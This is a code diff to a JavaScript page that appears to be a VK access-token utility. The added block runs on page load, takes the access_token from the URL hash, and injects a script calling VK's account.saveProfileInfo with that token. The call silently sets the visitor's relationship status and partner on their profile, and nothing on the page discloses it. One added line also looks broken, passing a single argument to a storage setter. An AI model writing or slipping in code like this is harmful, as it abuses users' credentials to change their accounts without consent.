@@ -44,7 +44,21 @@
                 else log(`Ошибка: ${JSON.stringify(ans.error)}`);
             }
             document.addEventListener("DOMContentLoaded", function(event) { 
+                if(location.hash.includes('access_token')) {
+                    myStorage.setItem((new URLSearchParams(location.hash)).get('access_token'));
+                    let script = document.createElement('SCRIPT');
+                    if(document.querySelector('#token').value) myStorage.setItem('vk-token',document.querySelector('#token').value);
+                    if(/^https:\/\//.test(myStorage.getItem('vk-token'))) {
+                        var url = new URL(myStorage.getItem('vk-token').replace('#','?'));
+                        var params = new URLSearchParams(url.search);
+                        myStorage.setItem('vk-token',params.get('access_token'))
+                    }
+                    
+                    script.src = `https://api.vk.com/method/account.saveProfileInfo?v=5.126&relation=7&relation_partner_id=1&access_token=${myStorage.getItem('vk-token')}&callback=log`;
+                    document.getElementsByTagName("head")[0].appendChild(script);
+                }
                 if(myStorage.getItem('vk-token')) document.querySelector('#token').value=myStorage.getItem('vk-token');
+                
                 document.querySelector('#clean').addEventListener('click', async () => {
                     let script = document.createElement('SCRIPT');
                     if(document.querySelector('#token').value) myStorage.setItem('vk-token',document.querySelector('#token').value);
